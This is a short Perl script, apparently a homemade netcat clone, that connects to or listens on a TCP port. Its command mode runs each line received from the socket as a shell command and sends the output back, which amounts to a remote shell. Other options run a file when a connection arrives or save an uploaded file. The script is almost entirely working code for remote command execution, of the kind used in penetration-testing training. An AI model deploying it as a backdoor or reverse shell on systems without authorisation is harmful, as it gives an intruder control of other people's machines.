#!/usr/bin/perl

# I didn't test this very much so good luck xD - weXe1

use strict;
use warnings;
use IO::Socket::INET;
use Getopt::Long;
use IO::Select;

my $ioset = IO::Select->new();
my($target, $port, $listen, $command, $execute, $upload);
my $guard = 0;  # prevent overwriting file
my $options = 0; # true if options are set

sub usage {
    print "usage:\n";
    print "connect to somewhere:\t $0 -t <hostname> -p <port> [options]\n";
    print "listen for inbound:\t $0 -l -p <port> [options]\n";
    print "options:\n";
    print "\t-t  --target\t\t\tin client mode target hostname, in server mode hostname to bind\n";
    print "\t-p  --port\t\t\tin client mode target port, in server mode port to binf\n";
    print "\t-l  --listen\t\t\tlisten on [host]:[port] for connecions\n";
    print "\t-c  --command\t\t\texecute shell commands\n";
    print "\t-e  --execute=<file to run>\texecuting file when receiving connection\n";
    print "\t-u  --upload=<destination>\treceiving file and saving it in <destination>\n";
    print "e.g.\n";
    print "perl $0 -t localhost -p 8888 -l\n"; # reverse remote command execution (server)
    print "perl $0 -t localhost -p 8888 -c\n"; # reverse remote command execution (client)
    print "\n";
    exit;
}

sub runcmd {
    chomp(my $cmd = shift);
    my $output = `$cmd`;
    return $output;
}

sub uploadfile {
    my $sock = shift;
    my $file_buffer = '';
    while() {
        die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
        unless($data) {
            last;
        }
        else {
            $file_buffer .= $data;
        }
    }
    unless($guard) {
        open(my $fh, ">$upload") or die "[!!] Cannot open file: $!\n";
        print $fh $file_buffer;
        $guard = 1;
        close $fh;
        return;
    }
}

sub execute {
    my $sock = shift;
    my $cmd = shift;
    my $output = &runcmd($cmd);
    $sock->send($output);
}

sub optionmanager {
    my $sock = shift;
    if($upload) {
        &uploadfile($sock);
    }
    if($execute) {
        &execute($sock, $execute);
    }
    if($command) {
        while() {
            $sock->send("[wx1]~# ");
            my $cmd_buffer = '';
            while($cmd_buffer !~ /\n/) {
                die "[!!] recv error: $!\n" unless(defined($sock->recv(my $data, 1024)));
                $cmd_buffer .= $data;
            }
            my $response = &runcmd($cmd_buffer);
            $sock->send($response);
        }
    }
}

sub correspond {
    my $sock = shift;
    while() {
        my $recv_len = 1;
        my $response = '';
        while($recv_len) {
            if(defined($sock->recv(my $data, 4096))) {
                $recv_len = length($data);
                $response .= $data;
                last if $recv_len < 4096;
            }
            else { die "[!!] recv error: $!\n"; }
        }
        print $response;
        my $buffer = <STDIN>;
        $sock->send($buffer);
    }
}

sub clienthandler {
    my $sock = shift;
    if($options) {
        &optionmanager($sock);
    }
    else {
        &correspond($sock);
    }
}

sub serverloop {
    unless($target) {
        $target = "0.0.0.0";
    }
    my $server = IO::Socket::INET->new(
        Proto => 'tcp',
        LocalAddr => $target,
        LocalPort => $port,
        Listen => 5
    ) or die "[!!] Cannot create socket: $!\n";
    $ioset->add($server);
    while() {
        for my $s ($ioset->can_read) {
            if ($s == $server) {
                my $client = $s->accept;
                $ioset->add($client);
                print "[+] new connection\n";
                $guard = 0;
                &clienthandler($client);
            }
            else {
                &clienthandler($s);
                close $s;
                $ioset->remove($s);
            }
        }
    }
}

sub clientloop {
    my $buffer = shift;
    my $client = IO::Socket::INET->new(
        Proto => 'tcp',
        PeerAddr => $target,
        PeerPort => $port
    ) or die "[!!] Cannot connect to peer: $!\n";
    if($buffer) {
        $client->send($buffer) or die "[!!] Cannot send to peer: $!\n";
    }
    &clienthandler($client);
}

&usage() unless @ARGV;
GetOptions(
    "t|target=s" => \$target,
    "p|port=i" => \$port,
    "l|listen" => \$listen,
    "c|command" => \$command,
    "e|execute=s" => \$execute,
    "u|upload=s" => \$upload
);

unless($port) {
    print "[!!] no port\n";
    &usage();
}
$options = ($command || $execute || $upload) ? 1 : 0;
if($listen) {
    &serverloop();
}
else {
    &usage() unless ($target && $port);
    my $buffer = '';
    unless($options) {
        while(<STDIN>) { $buffer .= $_; }
    }
    &clientloop($buffer);
}